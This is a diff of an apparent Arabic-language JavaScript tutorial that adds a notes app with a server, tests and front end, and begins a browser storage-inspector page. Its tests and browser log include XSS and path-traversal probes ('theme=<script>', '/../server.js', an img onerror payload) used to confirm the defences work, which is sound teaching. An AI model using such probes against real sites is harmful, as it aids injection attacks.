+        const note = { id: nextId++, title: data.title.trim(), body: data.body ?? "", version: 1, updatedAt: Date.now() };
+        notes.set(note.id, note);
+        res.setHeader("Location", "/api/notes/" + note.id);
+        return send(res, 201, note);
+      }
+      res.setHeader("Allow", "GET, POST");
+      return send(res, 405, { error: "method مش مسموح" });
+    }
+
+    const note = notes.get(id);
+    if (!note) return send(res, 404, { error: "الملاحظة دي اتمسحت أو مش موجودة" });
+    if (req.method === "GET") return send(res, 200, note);
+    if (req.method === "DELETE") { notes.delete(id); return send(res, 204); }
+    if (req.method === "PATCH") {
+      const { data, tooBig } = await readJson(req);
+      if (tooBig) return send(res, 413, { error: "الطلب كبير" });
+      const why = problem(data, true);
+      if (why) return send(res, 400, { error: why });
+      if (data.version !== note.version) return send(res, 409, { error: "الملاحظة اتعدلت من مكان تاني، حمّلها تاني", current: note });
+      const next = { ...note, version: note.version + 1, updatedAt: Date.now() };
+      if ("title" in data) next.title = data.title.trim();
+      if ("body" in data) next.body = data.body;
+      notes.set(id, next);
+      return send(res, 200, next);
+    }
+    res.setHeader("Allow", "GET, PATCH, DELETE");
+    return send(res, 405, { error: "method مش مسموح" });
+  });
+}
+
+if (require.main === module) {
+  const server = createApp();
+  server.listen(process.env.PORT || 3000, () => console.log("الملاحظات على http://localhost:" + server.address().port));
+}
+module.exports = { createApp };
+~~~
+
+~~~js server.test.js
+// server.test.js: اختبارات الـ API بـ node --test
+const { test, before, after } = require("node:test");
+const assert = require("node:assert/strict");
+const { createApp } = require("./server.js");
+
+let server, base;
+before(async () => {
+  server = createApp();
+  await new Promise(r => server.listen(0, r));
+  base = "http://localhost:" + server.address().port;
+});
+after(() => server.close());
+
+const api = (path, method = "GET", body) =>
+  fetch(base + path, { method, headers: body ? { "Content-Type": "application/json" } : {}, body: body && JSON.stringify(body) });
+
+test("POST بيعمل ملاحظة ويرجّع 201 و Location", async () => {
+  const res = await api("/api/notes", "POST", { title: "  اشتري بن  ", body: "نص كيلو" });
+  assert.equal(res.status, 201);
+  assert.equal(res.headers.get("location"), "/api/notes/1");
+  const note = await res.json();
+  assert.deepEqual([note.title, note.body, note.version], ["اشتري بن", "نص كيلو", 1]);
+});
+
+test("GET بيرجّع اللستة والملاحظة لوحدها", async () => {
+  const list = await (await api("/api/notes")).json();
+  assert.equal(list.length, 1);
+  const one = await api("/api/notes/1");
+  assert.equal(one.status, 200);
+});
+
+test("PATCH بالـ version الصح بيعدّل ويزوّد الـ version", async () => {
+  const res = await api("/api/notes/1", "PATCH", { body: "كيلو كامل", version: 1 });
+  assert.equal(res.status, 200);
+  const note = await res.json();
+  assert.deepEqual([note.title, note.body, note.version], ["اشتري بن", "كيلو كامل", 2]);
+});
+
+test("PATCH بـ version قديم = 409 ومعاه النسخة الحالية", async () => {
+  const res = await api("/api/notes/1", "PATCH", { body: "قديم", version: 1 });
+  assert.equal(res.status, 409);
+  assert.equal((await res.json()).current.version, 2);
+});
+
+test("التحقق: 400 للعنوان الفاضي والـ JSON البايظ", async () => {
+  assert.equal((await api("/api/notes", "POST", { title: "   " })).status, 400);
+  const bad = await fetch(base + "/api/notes", { method: "POST", body: "{bad" });
+  assert.equal(bad.status, 400);
+  assert.equal((await api("/api/notes", "POST", { title: "x".repeat(81) })).status, 400);
+});
+
+test("DELETE = 204 وبعده 404، ومرتين = 404", async () => {
+  assert.equal((await api("/api/notes/1", "DELETE")).status, 204);
+  assert.equal((await api("/api/notes/1")).status, 404);
+  assert.equal((await api("/api/notes/1", "DELETE")).status, 404);
+});
+
+test("405 و Allow للـ method الغلط", async () => {
+  const res = await api("/api/notes", "PUT", { title: "x" });
+  assert.equal(res.status, 405);
+  assert.equal(res.headers.get("allow"), "GET, POST");
+});
+
+test("الصفحة بتاخد الثيم من الكوكي، والملفات اللي برّه اللستة 404", async () => {
+  const page = await (await fetch(base + "/", { headers: { Cookie: "theme=dark" } })).text();
+  assert.match(page, /data-theme="dark"/);
+  const evil = await (await fetch(base + "/", { headers: { Cookie: "theme=<script>" } })).text();
+  assert.match(evil, /data-theme="light"/);
+  assert.equal((await fetch(base + "/../server.js")).status, 404);
+  assert.equal((await fetch(base + "/public/app.js")).status, 404);
+});
+~~~
+
+~~~html public/index.html
+<!doctype html>
+<html lang="ar" dir="rtl" data-theme="light">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>ملاحظاتي</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header>
+    <h1>ملاحظاتي</h1>
+    <button id="theme" type="button" aria-pressed="false">الوضع الغامق</button>
+  </header>
+  <p id="banner" role="alert" hidden></p>
+  <form id="form">
+    <label>العنوان <input name="title" maxlength="80" required></label>
+    <label>الملاحظة <textarea name="body" rows="3" maxlength="2000"></textarea></label>
+    <p id="form-error" class="error" aria-live="polite"></p>
+    <div class="row">
+      <button id="save" type="submit">أضف</button>
+      <button id="cancel" type="button" hidden>إلغاء التعديل</button>
+      <small id="draft-state"></small>
+    </div>
+  </form>
+  <p id="empty" hidden>مفيش ملاحظات لسه. اكتب أول واحدة فوق.</p>
+  <ul id="list"></ul>
+  <template id="note-tpl">
+    <li class="note">
+      <h2></h2>
+      <p class="body"></p>
+      <div class="row">
+        <button type="button" data-act="edit">عدّل</button>
+        <button type="button" data-act="delete">امسح</button>
+      </div>
+    </li>
+  </template>
+  <script src="app.js" defer></script>
+</body>
+</html>
+~~~
+
+~~~css public/style.css
+:root { --bg: #fff; --fg: #1b1b1b; --card: #f3f4f6; --line: #d1d5db; --accent: #0b6e4f; --err: #b42318; }
+[data-theme="dark"] { --bg: #111418; --fg: #e8eaed; --card: #1d2228; --line: #3a414a; --accent: #5fd3a6; --err: #ff8a80; }
+* { box-sizing: border-box; }
+body { margin: 0 auto; max-width: 640px; padding: 16px; font: 16px/1.6 system-ui, sans-serif; background: var(--bg); color: var(--fg); }
+header { display: flex; justify-content: space-between; align-items: center; gap: 8px; }
+h1 { font-size: 1.5rem; margin: 0; }
+label { display: block; margin-block: 8px; }
+input, textarea { display: block; width: 100%; padding: 8px; font: inherit; color: inherit; background: var(--card); border: 1px solid var(--line); border-radius: 6px; }
+button { font: inherit; padding: 6px 14px; border-radius: 6px; border: 1px solid var(--line); background: var(--card); color: inherit; cursor: pointer; }
+button[type="submit"] { background: var(--accent); color: var(--bg); border-color: var(--accent); }
+.row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+.error { color: var(--err); min-height: 1.6em; margin: 0; }
+#banner { background: var(--err); color: #fff; padding: 8px 12px; border-radius: 6px; }
+#list { list-style: none; padding: 0; display: grid; gap: 10px; }
+.note { background: var(--card); border: 1px solid var(--line); border-radius: 8px; padding: 10px 14px; }
+.note h2 { font-size: 1.1rem; margin: 0 0 4px; }
+.note .body { margin: 0 0 8px; white-space: pre-wrap; overflow-wrap: anywhere; }
+.note.editing { outline: 2px solid var(--accent); }
+~~~
+
+~~~js public/app.js
+// app.js: الصفحة بتكلّم الـ API بـ fetch، وبتفتكر المسودة في localStorage والثيم في كوكي
+const API = "/api/notes";
+const DRAFT_KEY = "notes-draft";
+const $ = sel => document.querySelector(sel);
+const form = $("#form");
+let notes = [];
+let editing = null; // وقت التعديل: { id, version }
+
+// ١. التخزين: localStorage ممكن يرمي (sandbox أو إعدادات)، فكل وصول جوه try
+const store = {
+  get(key) { try { return localStorage.getItem(key); } catch { return null; } },
+  set(key, value) { try { localStorage.setItem(key, value); return true; } catch { return false; } },
+  remove(key) { try { localStorage.removeItem(key); } catch {} },
+};
+
+// ٢. الطلبات: دالة واحدة بتحوّل أي رد مش ok لـ Error فيه الـ status ورسالة السيرفر
+async function request(path, method = "GET", body) {
+  let res;
+  try {
+    res = await fetch(path, { method, headers: body ? { "Content-Type": "application/json" } : {}, body: body && JSON.stringify(body) });
+  } catch {
+    throw Object.assign(new Error("السيرفر مش بيرد. اتأكد إنه شغال وجرّب تاني."), { status: 0 });
+  }
+  const data = res.status === 204 ? null : await res.json().catch(() => null);
+  if (!res.ok) throw Object.assign(new Error(data?.error || "حصل خطأ " + res.status), { status: res.status, data });
+  return data;
+}
+
+function banner(text) {
+  $("#banner").textContent = text || "";
+  $("#banner").hidden = !text;
+}
+
+// ٣. الرسم: textContent بس، عشان عنوان فيه <script> يتكتب نص
+function render() {
+  const list = $("#list");
+  list.replaceChildren();
+  for (const note of notes) {
+    const li = $("#note-tpl").content.firstElementChild.cloneNode(true);
+    li.dataset.id = note.id;
+    li.querySelector("h2").textContent = note.title;
+    li.querySelector(".body").textContent = note.body;
+    li.classList.toggle("editing", editing?.id === note.id);
+    list.append(li);
+  }
+  $("#empty").hidden = notes.length > 0;
+}
+
+async function load() {
+  try {
+    notes = await request(API);
+    banner("");
+  } catch (err) {
+    banner(err.message);
+  }
+  render();
+}
+
+// ٤. المسودة: كل حرف بيتحفظ، وبتتمسح بعد الحفظ الناجح
+function saveDraft() {
+  if (editing) return;
+  const ok = store.set(DRAFT_KEY, JSON.stringify({ title: form.title.value, body: form.body.value }));
+  $("#draft-state").textContent = ok ? "المسودة محفوظة" : "المسودة مش هتتحفظ هنا (التخزين مقفول)";
+}
+function restoreDraft() {
+  try {
+    const draft = JSON.parse(store.get(DRAFT_KEY));
+    if (draft && typeof draft.title === "string") {
+      form.title.value = draft.title;
+      form.body.value = typeof draft.body === "string" ? draft.body : "";
+      $("#draft-state").textContent = "رجّعنا المسودة";
+    }
+  } catch {
+    store.remove(DRAFT_KEY);
+  }
+}
+
+function startEdit(note) {
+  editing = { id: note.id, version: note.version };
+  form.title.value = note.title;
+  form.body.value = note.body;
+  $("#save").textContent = "احفظ التعديل";
+  $("#cancel").hidden = false;
+  form.title.focus();
+  render();
+}
+function stopEdit() {
+  editing = null;
+  form.reset();
+  $("#save").textContent = "أضف";
+  $("#cancel").hidden = true;
+  $("#form-error").textContent = "";
+  restoreDraft();
+  render();
+}
+
+form.addEventListener("input", saveDraft);
+form.addEventListener("submit", async e => {
+  e.preventDefault();
+  const body = { title: form.title.value, body: form.body.value };
+  $("#save").disabled = true;
+  $("#form-error").textContent = "";
+  try {
+    if (editing) {
+      await request(API + "/" + editing.id, "PATCH", { ...body, version: editing.version });
+      stopEdit();
+    } else {
+      await request(API, "POST", body);
+      form.reset();
+      store.remove(DRAFT_KEY);
+      $("#draft-state").textContent = "";
+    }
+    await load();
+  } catch (err) {
+    if (err.status === 0) banner(err.message);
+    else $("#form-error").textContent = err.message;
+    if (err.status === 404) { stopEdit(); await load(); }
+    if (err.status === 409) editing.version = err.data.current.version;
+  } finally {
+    $("#save").disabled = false;
+  }
+});
+$("#cancel").addEventListener("click", stopEdit);
+
+// ٥. event delegation: listener واحد على اللستة لكل الزراير
+$("#list").addEventListener("click", async e => {
+  const btn = e.target.closest("button[data-act]");
+  if (!btn) return;
+  const id = Number(btn.closest("li").dataset.id);
+  const note = notes.find(n => n.id === id);
+  if (btn.dataset.act === "edit") return startEdit(note);
+  if (btn.dataset.confirm !== "1") {
+    btn.dataset.confirm = "1";
+    btn.textContent = "متأكد؟";
+    return;
+  }
+  try {
+    await request(API + "/" + id, "DELETE");
+  } catch (err) {
+    if (err.status !== 404) return banner(err.message);
+  }
+  if (editing?.id === id) stopEdit();
+  await load();
+});
+
+// ٦. الثيم في كوكي: السيرفر بيقراه ويحطه في الـ HTML قبل ما الصفحة توصل، فمفيش وميض
+function setTheme(theme) {
+  document.documentElement.dataset.theme = theme;
+  document.cookie = "theme=" + theme + "; max-age=" + 60 * 60 * 24 * 365 + "; path=/; SameSite=Lax";
+  $("#theme").setAttribute("aria-pressed", String(theme === "dark"));
+}
+$("#theme").setAttribute("aria-pressed", String(document.documentElement.dataset.theme === "dark"));
+$("#theme").addEventListener("click", () => setTheme(document.documentElement.dataset.theme === "dark" ? "light" : "dark"));
+
+// ٧. تاب تاني غيّر المسودة؟ حدّث الفورم هنا
+addEventListener("storage", e => { if (e.key === DRAFT_KEY && !editing) restoreDraft(); });
+
+restoreDraft();
+load();
+~~~
+
+## ترتيب البناء
+
+1. **الـ API لوحده واختباراته:** [[createApp()]] بترجّع السيرفر من غير [[listen]]، فالاختبار يشغّله على بورت [[0]] (أي بورت فاضي) ويقفله في الآخر. اتكتبت الاختبارات مع كل route.
+2. **الصفحة الثابتة:** [[FILES]] لستة بيضا بالملفات المسموح بيها بالظبط. مفيش [[path.join]] على عنوان جاي من اليوزر، فـ [[/../server.js]] مستحيل (اختبار ٨).
+3. **[[request()]] في الصفحة:** دالة واحدة لكل الطلبات بتحوّل الشبكة الواقعة لـ [[status: 0]] والرد اللي مش ok لـ [[Error]] فيه [[status]] و [[data]].
+4. **الرسم:** [[template]] و [[cloneNode(true)]] و [[textContent]] بس، و [[replaceChildren()]] كل مرة.
+5. **المسودة والثيم والأحداث** في الآخر.
+
+## أهم الحتت
+
+- **الـ 409 (optimistic concurrency):** كل ملاحظة ليها [[version]] بيزيد مع كل تعديل. الصفحة بتبعت الـ version اللي عندها مع [[PATCH]]، ولو السيرفر لقاه قديم (حد عدّل من تاب تاني) بيرجّع 409 ومعاه [[current]]. الصفحة بتعرض الرسالة وبتاخد الـ version الجديد، فالضغطة التانية على «احفظ التعديل» بتنجح. يعني اليوزر اتبلّغ وقرر يكتب فوق.
+- **الثيم من غير وميض:** [[themeFrom(req)]] بيقرا الكوكي من [[req.headers.cookie]] ويحطها في [[data-theme]] قبل ما الـ HTML يتبعت. ولو الكوكي فيها أي حاجة غير [["light"]] و [["dark"]] (زي [[<script>]]) بيحط [["light"]]: قيمة من اليوزر رايحة جوه HTML لازم تبقى من لستة (اختبار ٨).
+- **[[readJson]] بحد ١٠٠٠٠ حرف** و 413: من غيره أي حد يبعت body بجيجا والسيرفر يجمّعه في الذاكرة.
+- **[[store]] في الصفحة:** [[localStorage]] جوه [[try]] في كل وصول، و «المسودة مش هتتحفظ هنا» لو ممنوع.
+- **[[saveDraft]] بيتجاهل وقت التعديل:** وإلا تعديل ملاحظة قديمة كان هيكتب فوق مسودة ملاحظة جديدة.
+- **المسح بتأكيد من غير [[confirm()]]:** [[data-confirm]] على الزرار، وأول ضغطة بتغيّر النص بس. [[confirm()]] بيوقف الصفحة كلها ومش بيتعمله style. والـ 404 في المسح بيتعامل كنجاح (اتمسحت خلاص من مكان تاني).
+
+## اللي ظهر وإحنا بنبنيه
+
+- **أول تجربة من Playwright قالت [[page.goto: net::ERR_CONNECTION_REFUSED at http://localhost:3100/]]:** السيرفر اتشغّل في الخلفية والمتصفح سبقه. [[curl -s localhost:3100/api/notes]] بعدها بثانية رجّع [[[]]]، فالحل إنك تستنى سطر «الملاحظات على http://localhost:3100» قبل ما تفتح الصفحة (وفي CI: سكربت يستنى البورت).
+- **الـ 409 مش «دمج»:** في التجربة، تاب تاني غيّر نص الملاحظة لـ «من تاب تاني»، وبعدين احنا حفظنا «كيلو كامل»: أخدنا 409، والضغطة التانية نجحت وكتبت «كيلو كامل» فوق «من تاب تاني». اليوزر اتبلّغ، بس التعديل التاني راح. ده سلوك مقصود هنا ومكتوب في التوسعة (٣) إزاي تعرض النسختين.
+- **[[PATCH]] بينسخ [[title]] و [[body]] بس:** لو كان [[{ ...note, ...data }]] كان الـ [[version]] اللي جاي من الصفحة (القديم) هيكتب فوق الجديد، وأي حقل زيادة في الـ body هيتخزّن.
+
+## اتقاس
+
+~~~text الناتج: node --test (Node 24.22)
+✔ POST بيعمل ملاحظة ويرجّع 201 و Location
+✔ GET بيرجّع اللستة والملاحظة لوحدها
+✔ PATCH بالـ version الصح بيعدّل ويزوّد الـ version
+✔ PATCH بـ version قديم = 409 ومعاه النسخة الحالية
+✔ التحقق: 400 للعنوان الفاضي والـ JSON البايظ
+✔ DELETE = 204 وبعده 404، ومرتين = 404
+✔ 405 و Allow للـ method الغلط
+✔ الصفحة بتاخد الثيم من الكوكي، والملفات اللي برّه اللستة 404
 ℹ tests 8
 ℹ pass 8
 ℹ fail 0
 ~~~
 
-~~~text الناتج: الحالات الطرفية (exit code بعد كل واحدة)
-$ node cli.mjs nope.csv
-مش لاقي الملف: nope.csv (ENOENT)
-(exit 1)
-$ node cli.mjs
-الاستخدام: node cli.mjs <file.csv> [--city Cairo] [--limit 1000] [--top 3]
-(exit 1)
-$ node cli.mjs sales.csv --limit -5
-Option '--limit' argument is ambiguous.
-Did you forget to specify the option argument for '--limit'?
-To specify an option argument starting with a dash use '--limit=-XYZ'.
-الاستخدام: node cli.mjs <file.csv> [--city Cairo] [--limit 1000] [--top 3]
-(exit 1)
-$ node cli.mjs sales.csv --limit=-5
-الاستخدام: node cli.mjs <file.csv> [--city Cairo] [--limit 1000] [--top 3]
-(exit 1)
-$ node cli.mjs sales.csv --colour red
-Unknown option '--colour'. To specify a positional argument starting with a '-', place it at the end of the command after '--', as in '-- "--colour"
-الاستخدام: node cli.mjs <file.csv> [--city Cairo] [--limit 1000] [--top 3]
-(exit 1)
-$ node cli.mjs empty.csv
-CsvError: الملف فاضي: مفيش header
-(exit 1)
-$ node cli.mjs sales.csv --city Giza --limit 5 --top 2
-صفوف محسوبة: 5 (مدينة Giza)
-الإيراد: 541.00
-  Giza                        541.00
-أكتر منتجات بالكمية: oil 24
-سطور بايظة: 0
-اتقرا 0.1 MB في 20ms، وأقصى ذاكرة 65 MB
-(exit 0)
+~~~text الناتج: الصفحة في Chrome 157 من PORT=3100 node server.js، Playwright
+الأول:              «مفيش ملاحظات لسه» ظاهرة
+كتابة:              المسودة محفوظة | {"title":"اشتري بن","body":"نص كيلو محوّج"}
+reload:             اشتري بن / رجّعنا المسودة
+أضف:                الكروت: اشتري بن | المسودة في localStorage: null
+عنوان فيه <img ...>: الـ h2 فيه &lt;img src=x onerror=alert(1)&gt; وعدد img في اللستة: 0
+عنوان مسافات:        العنوان مطلوب
+عدّل:               كارت عليه إطار: 1، الزرار: احفظ التعديل
+PATCH من برّه الفورم (زي تاب تاني) وبعدين احفظ: الملاحظة اتعدلت من مكان تاني، حمّلها تاني
+احفظ تاني:          الملاحظة اتحفظت، الزرار رجع: أضف
+امسح:               متأكد؟ ← وبعدين اتمسحت
+الثيم:              cookie: theme=dark ← الـ HTML من السيرفر فيه data-theme="dark" ← بعد reload: dark و aria-pressed=true
+السيرفر واقف:        بانر «السيرفر مش بيرد. اتأكد إنه شغال وجرّب تاني.» والمسودة لسه في localStorage
+عرض 360:            scrollWidth = 360 (مفيش scroll أفقي)
 ~~~
 
-- [[--limit -5]]: [[parseArgs]] نفسه رفضه لأن [[-5]] شكلها option تانية، ورسالته بتقترح [[--limit=-5]]. ولما اتكتبت كده عدّت من [[parseArgs]] ووقفت عند فحصنا [[limit > 0]].
-- الملف الفاضي: [[rows]] بترمي [[CsvError]] بعد الـ loop لو مفيش header، والـ CLI بيطبع اسمه ورسالته بس من غير stack trace.
-- [[--city Giza --limit 5]]: قرا 0.1 MB بس من 35.2 MB، لأن الـ [[break]] قفل الملف.
+ومفيش ولا [[pageerror]]. الأخطاء اللي في الـ Console كانت الـ 400 والـ 409 والـ 404 بتوع [[favicon.ico]] (المتصفح بيطبع أي رد مش ok كـ «Failed to load resource» حتى لو الكود اتعامل معاه).` },
+        { lvl: 'فكرة', dir: "storage-inspector", t: R`مفتش التخزين`, what: R`صفحة صغيرة تحطها في أي مشروع بتعرض كل اللي الـ origin ده حاطه في المتصفح من JavaScript: الكوكيز (اللي مش [[HttpOnly]])، و [[localStorage]] و [[sessionStorage]] بالمفاتيح والحجم، وقواعد IndexedDB، وكاشات Cache API بعدد الطلبات، والـ service workers المتسجلة، و [[navigator.storage.estimate()]]. وجنب كل قسم «امسح الكل». وأي قسم ممنوع يكتب «مش متاح هنا» بدل ما الصفحة تقع. من درس «تختار تخزين إيه».`, done: R`على origin فاضي كل الأقسام «فاضي»، و «حط بيانات تجربة» بيملا كوكي ومفتاحين وقاعدة وكاش، وكل «امسح الكل» بيفضّي قسمه، والـ service worker المتسجل بيظهر ويتشال. وفي الـ preview الحي كل قسم «مش متاح هنا: الصفحة معزولة (origin = null)».`, ext: R`(١) زرار تصدير كل ده JSON وتحميله بـ [[Blob]] و [[a.download]]، وزرار استيراد. (٢) جوه IndexedDB اعرض الـ object stores وعدد السجلات في كل واحد. (٣) اسمع على [[storage]] و [[cookieStore]] [[change]] وحدّث لوحده. (٤) خليه bookmarklet أو DevTools snippet تشغّله على أي موقع.`, sol: R`## الشكل النهائي
 
-### المقارنة: سطر سطر ولا الملف كله
+~~~live 560 index.html
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>مفتش التخزين</title>
+<style>
+  body { margin: 16px; font: 15px/1.6 system-ui, sans-serif; }
+  section { border: 1px solid #ccc; border-radius: 8px; padding: 8px 12px; margin-block: 10px; }
+  h2 { font-size: 1.05rem; margin: 0 0 6px; display: flex; justify-content: space-between; gap: 8px; }
+  table { border-collapse: collapse; width: 100%; font-size: 14px; table-layout: fixed; }
+  td, th { border-bottom: 1px solid #eee; padding: 2px 6px; text-align: start; overflow-wrap: anywhere; }
+  .muted { color: #666; }
+  button { font: inherit; font-size: 13px; }
+</style>
+</head>
+<body>
+<h1>مفتش التخزين</h1>
+<p class="muted">كل اللي الموقع ده (<span id="origin"></span>) حاطه في متصفحك، من JavaScript.</p>
+<p><button type="button" id="demo">حط بيانات تجربة</button> <button type="button" id="refresh">حدّث</button></p>
+<div id="out"></div>
+<script>
+const out = document.querySelector("#out");
+const size = s => new Blob([s]).size; // حجم النص بالبايت UTF-8
+const kb = n => (n < 1024 ? n + " بايت" : (n / 1024).toFixed(1) + " KB");
 
-~~~text الناتج: نفس التقرير بالطريقتين، وبعدين بـ heap مقفول على 64 MB
-$ node eager.mjs sales.csv
-صفوف: 999674 | 2074ms | ذاكرة 574 MB
-$ node cli.mjs sales.csv  (آخر سطر)
-اتقرا 35.2 MB في 1742ms، وأقصى ذاكرة 159 MB
-$ node --max-old-space-size=64 eager.mjs sales.csv
-FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory
-$ node --max-old-space-size=64 cli.mjs sales.csv  (آخر سطر)
-اتقرا 35.2 MB في 2621ms، وأقصى ذاكرة 137 MB
-~~~
-
-- الملف كله ([[readFileSync]] و [[split]] و [[Array.fromAsync]]): 574 MB ذاكرة عشان ملف 35 MB (النص نفسه، ومليون string للسطور، ومليون object للصفوف).
-- سطر سطر: 160 MB، وأغلبها garbage لسه الـ GC ملمّهوش. ولما قفلنا الـ heap على 64 MB، الـ GC اشتغل أكتر (الوقت زاد من 1.7 لـ 2.6 ثانية) والأداة خلصت، والنسخة التانية وقعت. ده الفرق الحقيقي: الذاكرة بتاعة سطر سطر **ثابتة** مهما كبر الملف.
-
-**الغلطات اللي حصلت وأنا ببنيه (حقيقية، واتصلحت):**
-
-1. **الملف فضل مفتوح بعد [[--limit]].** أول [[readLines]] كان [[yield* rl]] و [[rl.close()]] بس. الاختبار اللي بيتأكد إن الـ stream اتقفل وقع:
-
-~~~text الناتج من النسخة الأولى: node --test
-✖ limit: بيقف بدري ويقفل الـ stream قبل آخر الملف (12.2218ms)
-ℹ pass 7
-ℹ fail 1
-  AssertionError [ERR_ASSERTION]: الملف لسه مفتوح بعد ما التقرير وقف
-    actual: false,
-    expected: true,
-~~~
-
-الـ [[break]] في [[summarize]] قفل الـ generators والـ readline، بس الـ file stream وقف وفضل مفتوح (درس «AsyncIterator و async generators»، القسم ٧). الحل [[input.destroy()]] في الـ [[finally]].
-
-2. **عدّاد البايتات كان بيغيّر اللي بيقيسه.** أول نسخة كانت بتعدّ البايتات بـ [[input.on('data', ...)]]. ده بيحط الـ stream في flowing mode، فلما جرّبت من غير [[destroy]] على ملف 35 MB بـ [[highWaterMark]] صغير، العدّاد وصل للملف كله بعد الـ [[break]]. القياس نفسه كان بيقرا الملف! بدّلته بـ [[input.bytesRead]] اللي بيتقري في الـ [[finally]] من غير ما يأثّر على القراية.
-
-3. **[[--limit]] كان بيقرا صف زيادة.** أول نسخة من [[summarize]] كان فيها [[if (count >= limit) break]] **أول** الـ loop، فبعد ما توصل للـ limit بيطلب صف كمان عشان يكتشف إنه خلص. نقلته بعد الجمع، فالـ loop بيقف أول ما العدد يكمل.` },
-        { lvl: 'فكرة', t: R`collection بتاعتك بتتكلم لغة JavaScript كلها`, what: R`اختار data structure بتحتاجه (قايمة مترتبة، أو ring buffer للوجات، أو range أرقام أو تواريخ، أو tree)، واعمله class بتشتغل مع كل حاجة في اللغة: [[for...of]] و spread و destructuring ([[Symbol.iterator]])، و [[for await]] ([[Symbol.asyncIterator]])، و iterator helpers، واسم واضح في [[console.log]] ([[Symbol.toStringTag]])، و [[String()]] و [[+]] ([[Symbol.toPrimitive]])، و [[instanceof]] حتى لو فيه نسختين من الكود ([[Symbol.hasInstance]] بـ [[Symbol.for]]). من الوحدة كلها.`, done: R`الـ class بتاعتك بتعدّي على: [[[...x]]] و [[const [a, b] = x]] و [[Math.max(...x)]] و [[await Array.fromAsync(x)]] و [[x.values().filter(...).toArray()]] و [[String(x)]] و [[console.log(x)]] باسم مفهوم، و [[instanceof]] بيقول [[true]] لنسخة من نفس الـ class و [[false]] لـ [[structuredClone]] منها. وكتبت جملة لكل Symbol استخدمته: ليه.`, ext: R`خلّي [[Symbol.hasInstance]] يشتغل بين نسختين من الـ module فعلًا (اعمل نسخة من الملف باسم تاني واستورد الاتنين)، وزوّد [[Symbol.dispose]] لما Node يدعم [[using]] من غير flags، واكتب اختبارات بـ [[node --test]] لكل بروتوكول.`, sol: R`**نسخة نموذجية:** [[SortedList]]: قايمة بتفضل مترتبة وانت بتضيف (binary search على مكان كل عنصر جديد)، وبتاخد دالة مقارنة لأي نوع. اخترتها لأنها حاجة بتتحتاج فعلًا (أسعار، مواعيد، ترتيب أبجدي عربي) و الـ array العادية بتتطلب [[sort]] بعد كل إضافة.
-
-~~~text الناتج: node sorted-list.mjs
-[ 12, 12, 30, 45, 50, 99 ] 6 12, 12, 30, 45, 50, 99 6 12, 12, 30, 45, 50, 99
-[object SortedList(6)] SortedList [SortedList(6)] {}
-[ '34.20', '51.30', '57.00', '112.86' ]
-[ 30, 45, 50 ] [ 12, 12 ]
-12 12 99
-[ 12, 12, 30, 45, 50, 99 ]
-برتقال ، تفاح ، موز
-[ 1, 2 ]
-true false true
-~~~
-
-~~~js sorted-list.mjs
-// sorted-list.mjs: collection بتفضل مترتبة، وبتتكلم لغة JavaScript كلها بالـ well-known symbols
-const BRAND = Symbol.for('shop.SortedList');
-
-export class SortedList {
-  #items = [];
-  #compare;
-  constructor(iterable = [], compare = (a, b) => (a < b ? -1 : a > b ? 1 : 0)) {
-    this.#compare = compare;
-    Object.defineProperty(this, BRAND, { value: true });
-    for (const x of iterable) this.add(x);
+function section(title, rows, clear) {
+  const sec = document.createElement("section");
+  const h = document.createElement("h2");
+  h.textContent = title;
+  if (clear && Array.isArray(rows) && rows.length) {
+    const b = document.createElement("button");
+    b.type = "button";
+    b.textContent = "امسح الكل";
+    b.addEventListener("click", async () => { await clear(); render(); });
+    h.append(b);
   }
-  add(x) {
-    let lo = 0, hi = this.#items.length;
-    while (lo < hi) { const mid = (lo + hi) >> 1; if (this.#compare(this.#items[mid], x) <= 0) lo = mid + 1; else hi = mid; }
-    this.#items.splice(lo, 0, x);
-    return this;
-  }
-  get size() { return this.#items.length; }
-  *[Symbol.iterator]() { yield* this.#items; }
-  values() { return this[Symbol.iterator](); }
-  *between(min, max) {
-    for (const x of this.#items) {
-      if (this.#compare(x, max) > 0) return;
-      if (this.#compare(x, min) >= 0) yield x;
+  sec.append(h);
+  if (typeof rows === "string") {
+    const p = document.createElement("p");
+    p.className = "muted";
+    p.textContent = rows;
+    sec.append(p);
+  } else if (!rows.length) {
+    const p = document.createElement("p");
+    p.className = "muted";
+    p.textContent = "فاضي";
+    sec.append(p);
+  } else {
+    const table = document.createElement("table");
+    for (const [a, b] of rows) {
+      const tr = table.insertRow();
+      tr.insertCell().textContent = a;
+      tr.insertCell().textContent = b;
     }
+    sec.append(table);
   }
-  async *[Symbol.asyncIterator]() { for (const x of this.#items) yield x; }
-  get [Symbol.toStringTag]() { return 'SortedList(' + this.size + ')'; }
-  [Symbol.toPrimitive](hint) { return hint === 'number' ? this.size : this.#items.join(', '); }
-  static [Symbol.hasInstance](x) { return x !== null && typeof x === 'object' && x[BRAND] === true; }
+  return sec;
 }
 
-const prices = new SortedList([45, 12, 99, 30]);
-prices.add(50).add(12);
-console.log([...prices], prices.size, String(prices), +prices, $__bt$__{prices}$__bt);
-console.log(Object.prototype.toString.call(prices), prices);
-console.log(prices.values().filter((p) => p > 20).map((p) => p * 1.14).toArray().map((p) => p.toFixed(2)));
-console.log([...prices.between(20, 50)], prices.between(0, 1e9).take(2).toArray());
-const [cheapest, second] = prices;
-console.log(cheapest, second, Math.max(...prices));
-console.log(await Array.fromAsync(prices));
-const words = new SortedList(['موز', 'تفاح', 'برتقال'], (a, b) => a.localeCompare(b, 'ar'));
-console.log([...words].join(' ، '));
-const byDate = new SortedList([{ id: 2, at: '2026-11-21' }, { id: 1, at: '2026-11-01' }], (a, b) => a.at.localeCompare(b.at));
-console.log([...byDate].map((o) => o.id));
-console.log(prices instanceof SortedList, structuredClone(prices) instanceof SortedList, { [Symbol.for('shop.SortedList')]: true } instanceof SortedList);
+// كل مصدر ممكن يرمي (إعدادات، متصفح قديم)، فكل واحد في try لوحده.
+// وصفحة معزولة (iframe عليه sandbox) الـ origin بتاعها "null": مفيش تخزين أصلًا، فمنسألش
+async function tryRows(fn) {
+  if (origin === "null") return "مش متاح هنا: الصفحة معزولة (origin = null)";
+  try { return await fn(); } catch (err) { return "مش متاح هنا: " + err.name; }
+}
+
